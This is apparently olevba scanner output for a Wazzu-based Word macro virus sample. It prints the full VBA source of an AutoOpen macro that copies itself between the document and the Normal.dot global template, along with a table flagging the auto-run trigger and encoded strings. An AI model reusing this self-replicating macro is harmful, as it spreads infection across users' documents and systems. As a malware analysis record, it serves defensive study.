olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Wazzu-based-1a04bc01c563dcfe6720eed041c0d5860346fa1b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Wazzu-based-1a04bc01c563dcfe6720eed041c0d5860346fa1b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutooPEn.bas 
in file: Virus.MSWord.Wazzu-based-1a04bc01c563dcfe6720eed041c0d5860346fa1b - OLE stream: 'Macros/VBA/AutooPEn'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim F$
Dim G$
Dim M$
On Error GoTo -1: On Error GoTo MinSize
F$ = WordBasic.[FileName$]() + ":AutooPEn"
G$ = "Global:AutooPEn"
M$ = UCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))
If M$ = "NORMAL.DOT" Then
WordBasic.MacroCopy G$, F$
WordBasic.FileSaveAs Format:=1
Else
WordBasic.MacroCopy F$, G$, 1
End If
MinSize:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutooPEn            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

